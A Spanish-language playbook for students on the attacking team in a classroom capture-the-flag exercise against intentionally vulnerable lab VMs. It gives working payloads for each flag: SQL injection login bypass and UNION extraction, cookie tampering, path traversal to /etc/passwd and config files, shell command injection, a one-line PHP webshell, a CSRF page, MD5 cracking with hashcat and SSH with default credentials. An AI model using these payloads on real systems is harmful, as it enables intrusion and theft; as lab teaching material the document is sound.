# Red Team Playbook - CTF UCC 15 vs 15

> Guia rapida para los 15 estudiantes que atacan los labs IDS / UWS.
> Cada vector da una bandera. Hay 7 vectores web + 1 SSH = 8 banderas por lab.
> Multiples vectores son **independientes**: un grupo puede ir por SQLi mientras
> otro va por Upload RCE sin pisarse.

## URLs

Cada lab vive en una VM distinta dentro de la misma red de clase. Pidan al
instructor las IPs y el puerto del scoreboard.

| Recurso          | URL / comando                                 |
|------------------|-----------------------------------------------|
| Lab IDS          | http://`<IP-VM1>`:8080                        |
| Lab UWS          | http://`<IP-VM2>`:8081                        |
| Scoreboard 15v15 | http://`<IP-SCOREBOARD>`:9000 (UNA sola VM)   |
| SSH IDS          | `ssh admin@<IP-VM1> -p 2222` (`password123`)  |
| SSH UWS          | `ssh admin@<IP-VM2> -p 2223` (`password123`)  |

> En el dashboard de cada lab, si el instructor configuro la variable
> `SCOREBOARD_URL`, veran un banner naranja/azul con el link directo.

## Tabla de vectores

| # | Vector              | Punto de entrada                      | Bandera                       | Pts |
|---|---------------------|---------------------------------------|-------------------------------|-----|
| 1 | SQL Injection       | `/index.php` login                    | `FLAG{UCC_<lab>_SQLi_Bypass}` | 50  |
| 2 | Cookie tamper       | `/admin.php` con cookie `role=admin`  | `FLAG{UCC_<lab>_Cookie_Bypass}` | 75 |
| 3 | LFI                 | `/download.php?file=...`              | `FLAG{UCC_<lab>_LFI_Found}`   | 60  |
| 4 | LFI -> config leak  | `/download.php?file=../config/app.ini`| `FLAG{UCC_<lab>_Config_Leaked}` | 70 |
| 5 | Command Injection   | `/network.php` (host con `;`/backtick)| `FLAG{UCC_<lab>_Cmd_Inject}`  | 80  |
| 6 | Upload RCE          | `/upload.php` (subir webshell .php)   | `FLAG{UCC_<lab>_Upload_RCE}`  | 120 |
| 7 | Hash cracking       | tabla `secrets` (via SQLi)            | `FLAG{UCC_<lab>_Hash_Cracked}`| 100 |
| 8 | SSH pivot           | `ssh admin@... -p 2222/2223`          | `FLAG{UCC_Ciber_Atrapada}` / `FLAG{UCC_UWS_Pwned}` | 150 |

`<lab>` = `IDS` o `UWS`. Sustituir segun el lab que ataquen.

## Quick wins por subgrupo (Red Team de 15 → 5 trios)

### Trio 1 - SQLi + cookie
1. `' OR '1'='1' -- ` en el campo usuario.
2. Submit.
3. Ya estan dentro como `root` o `admin`. Nota la bandera SQLi.
4. Visiten `/admin.php` con la cookie `role=admin` (DevTools → Application → Cookies).
5. La bandera intermedia aparece en pantalla.

### Trio 2 - LFI / config leak
1. Despues del SQLi, vayan a `/download.php`.
2. Probar nombres del bucket (`admin_notes.md`) → bandera LFI.
3. Probar `?file=../config/app.ini` → bandera de config leak.
4. Bonus: leer `/etc/passwd` con `?file=../../../../../etc/passwd`.

### Trio 3 - Command Injection
1. Ir a `/network.php`.
2. En el campo host poner: `db_ssh; cat /var/www/html/config/app.ini`.
3. Buscar la bandera en la salida; tambien funciona `localhost; id`.
4. Para la bandera completa, buscar archivos con `; find / -name "FLAG*" 2>/dev/null`.

### Trio 4 - Upload RCE + CSRF
1. Crear `shell.php` localmente con:
   ```php
   <?php system($_GET['c']); ?>
   ```
2. Subirlo via `/upload.php`.
3. Ejecutar: `http://<lab>/uploads/shell.php?c=cat+/var/www/html/config/app.ini`.
4. Bonus CSRF: subir `attacker.html` (template en `docs/csrf_demo/attacker.html`)
   y compartir el link con un compañero del Blue Team logueado.

### Trio 5 - Hash cracking + SSH
1. SQLi UNION para listar la tabla `secrets`:
   ```
   ' UNION SELECT 1,label,value FROM secrets -- 
   ```
2. Copiar los 3 hashes MD5 → `hashcat -m 0 -a 0 hashes.txt rockyou.txt`.
3. Pega los plaintext y reporten `FLAG{UCC_<lab>_Hash_Cracked}`.
4. Con `admin/password123` hagan `ssh admin@<ip> -p 2222` (IDS) o `2223` (UWS).
5. `cat /home/admin/flag.txt` → bandera final.

## Tips
- **Honeypots**: hay 3 banderas trampa. Si encuentran `FLAG{HONEYPOT_*}` o
  `FLAG{FAKE_*}`, **no las envien**: restan puntos.
- **Fingerprinting**: `/robots.txt` lista los endpoints "ocultos" con un TODO
  asociado. Es su roadmap rapido.
- **Scoreboard**: enviar varias veces la misma bandera no suma. El primer
  envio del equipo es el que cuenta.
